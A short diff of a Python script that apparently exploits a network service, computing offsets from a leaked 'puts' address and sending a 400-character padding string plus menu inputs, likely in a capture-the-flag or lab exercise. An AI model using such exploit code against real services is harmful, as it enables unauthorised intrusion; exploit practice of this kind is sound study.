@@ -52,11 +52,13 @@ try:
     def puts_offset(addr):
         return hex(int(puts_addr, 16) + int(addr, 16))
 
-    print(run_steps("2_write_book.txt"))
+    send("1\ny\n")
 
     # this part has to be done in the script,
     # because it calculates the offset
-    # print(send("a" * 4000))
+    send("a" * 400)
+    print(send("\n3\n\n"))
+    conn.recv(RECV_SIZE).decode()
 
     # Close the socket
     conn.close()
